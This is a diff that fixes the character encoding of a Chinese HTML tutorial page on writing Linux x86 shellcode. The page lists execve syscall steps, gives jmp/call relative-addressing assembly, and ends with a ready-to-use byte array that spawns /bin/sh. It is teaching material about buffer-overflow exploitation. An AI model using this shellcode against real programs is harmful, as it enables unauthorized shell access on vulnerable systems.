@@ -2,22 +2,22 @@
 <html>
 <head>
 <meta http-equiv="Content-Type" content="text/html; charset=gb2312">
-<title>�ޱ����ĵ�</title>
+<title>无标题文档</title>
 </head>
 
 <body bgcolor="#330066">
-<p><font color="#FFCCCC" size="+2" face="����_GB2312">��дshellcode�����嶯�����£�</font><font size="+2" face="����_GB2312"><br>
-  <font color="#FFFFFF">a) ����NULL��β���ִ�&quot;/bin/sh&quot;�ŵ��ڴ�ĳ���� <br>
-  b) ���ִ�&quot;/bin/sh&quot;�ĵ�ַ�ŵ��ڴ�ĳ���������һ���յĳ���(null long word)��<br>
-  c) ��0xb�ŵ��Ĵ���EAX�У�<br>
-  d) ���ִ�&quot;/bin/sh&quot;�ĵ�ַ�ŵ��Ĵ���EBX�У�<br>
-  e) ���ִ�&quot;/bin/sh&quot;��ַ�ĵ�ַ�ŵ��Ĵ���ECX�У�<br>
-  f) �ѿճ��ֵĵ�ַ�ŵ��Ĵ���EDX�У�<br>
-  g) ִ��ָ��int $0x80��<br>
-  h) ��0x1�ŵ��Ĵ���EAX�У�<br>
-  i) ��0x0�ŵ��Ĵ���EBX�У�<br>
-  j) ִ��ָ��int $0x80��</font></font></p>
-<p><font color="#FFCCCC" size="+2" face="����_GB2312">�Ի��������������д����</font><font color="#000000" size="+2" face="����_GB2312"><br>
+<p><font color="#FFCCCC" size="+2" face="楷体_GB2312">编写shellcode，具体动作如下：</font><font size="+2" face="楷体_GB2312"><br>
+  <font color="#FFFFFF">a) 把以NULL结尾的字串&quot;/bin/sh&quot;放到内存某处； <br>
+  b) 把字串&quot;/bin/sh&quot;的地址放到内存某处，后面跟一个空的长字(null long word)；<br>
+  c) 把0xb放到寄存器EAX中；<br>
+  d) 把字串&quot;/bin/sh&quot;的地址放到寄存器EBX中；<br>
+  e) 把字串&quot;/bin/sh&quot;地址的地址放到寄存器ECX中；<br>
+  f) 把空长字的地址放到寄存器EDX中；<br>
+  g) 执行指令int $0x80；<br>
+  h) 把0x1放到寄存器EAX中；<br>
+  i) 把0x0放到寄存器EBX中；<br>
+  j) 执行指令int $0x80。</font></font></p>
+<p><font color="#FFCCCC" size="+2" face="楷体_GB2312">以汇编代码把上述动作写出：</font><font color="#000000" size="+2" face="楷体_GB2312"><br>
   <font color="#FFFFFF">------------------------------------------------------------------------------ 
   <br>
   movl string_addr,string_addr_addr <br>
@@ -34,11 +34,11 @@
   /bin/sh string goes here. <br>
   ------------------------------------------------------------------------------ 
   </font><br>
-  <font color="#FFCCCC">���⣺�ǲ�֪����Ҫ�ƽ�ĳ�����ڴ�ռ��У���������(�������ִ�)�ᱻ�ŵ� <br>
-  �����ˡ�/bin/sh���ĵ�ַ����֪�����������Ѱַ���������������룺</font><br>
+  <font color="#FFCCCC">问题：们不知道在要破解的程序的内存空间中，上述代码(和其后的字串)会被放到 <br>
+  哪里，因此“/bin/sh”的地址并不知道，采用相对寻址方法修正上述代码：</font><br>
   <font color="#FFFFFF">------------------------------------------------------------------------------ 
   <br>
-  jmp offset-to-call # 2 bytes ����ó�offset-to-call = 0x2a<br>
+  jmp offset-to-call # 2 bytes 计算得出offset-to-call = 0x2a<br>
   popl %esi # 1 byte <br>
   movl %esi,array-offset(%esi) # 3 bytes <br>
   movb $0x0,nullbyteoffset(%esi)# 4 bytes <br>
@@ -51,11 +51,11 @@
   movl $0x1, %eax # 5 bytes <br>
   movl $0x0, %ebx # 5 bytes <br>
   int $0x80 # 2 bytes <br>
-  call offset-to-popl # 5 bytes ����ó�offset-to-popl = -0x2f<br>
+  call offset-to-popl # 5 bytes 计算得出offset-to-popl = -0x2f<br>
   /bin/sh string goes here. <br>
   ------------------------------------------------------------------------------ 
   </font><br>
-  <font color="#FFCCCC">���յó����룺<br>
+  <font color="#FFCCCC">最终得出代码：<br>
   shellcodeasm.c </font><br>
   <font color="#FFFFFF">------------------------------------------------------------------------------ 
   <br>
@@ -79,7 +79,7 @@
   &quot;); <br>
   } <br>
   ------------------------------------------------------------------------------</font><br>
-  <font color="#FFCCCC">����󷴻��õ������ƴ��롣�����shellcode��</font><br>
+  <font color="#FFCCCC">编译后反汇编得到二进制代码。这就是shellcode：</font><br>
   <font color="#FFFFFF">char shellcode[] = <br>
   &quot;\xeb\x2a\x5e\x89\x76\x08\xc6\x46\x07\x00\xc7\x46\x0c\x00\x00\x00&quot; 
   <br>
@@ -87,10 +87,10 @@
   <br>
   &quot;\xb8\x01\x00\x00\x00\xbb\x00\x00\x00\x00\xcd\x80\xe8\xd1\xff\xff&quot; 
   <br>
-  &quot;\xff\x2f\x62\x69\x6e\x2f\x73\x68\x00\x89\xec\x5d\xc3&quot;; </font></font><font color="#FFFFFF" face="����_GB2312"><br>
+  &quot;\xff\x2f\x62\x69\x6e\x2f\x73\x68\x00\x89\xec\x5d\xc3&quot;; </font></font><font color="#FFFFFF" face="楷体_GB2312"><br>
   </font></p>
-<p><font size="+2" face="����_GB2312"><br>
+<p><font size="+2" face="楷体_GB2312"><br>
   </font> </p>
-<p> <font face="����_GB2312"><a href="15.htm"><img src="images/backoff.jpg" width="38" height="29" border="0"></a></font></p>
+<p> <font face="楷体_GB2312"><a href="15.htm"><img src="images/backoff.jpg" width="38" height="29" border="0"></a></font></p>
 </body>
 </html>
